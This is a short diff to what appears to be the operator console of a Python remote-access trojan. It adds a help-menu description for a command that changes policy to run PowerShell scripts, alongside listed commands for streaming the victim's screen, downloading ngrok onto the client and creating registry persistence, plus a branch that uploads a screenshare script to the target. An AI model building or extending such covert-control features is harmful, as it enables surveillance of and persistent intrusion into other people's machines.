@@ -211,8 +211,8 @@ def target_communication(target, ip):
             screenshare                        --> stream client screen
             ssharescreen                       --> stopstreaming
             ngroksetup                         --> download ngrok on the client
-            changepolicy
-            persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
+            changepolicy                       --> execute powershell scripts
+            persistence *RegName* *fileName*   --> Create Persistence In Registry'''))
         elif command[:11] == 'screenshare':
             upload_file(target,'scripts\\screenshare.ps1')
 
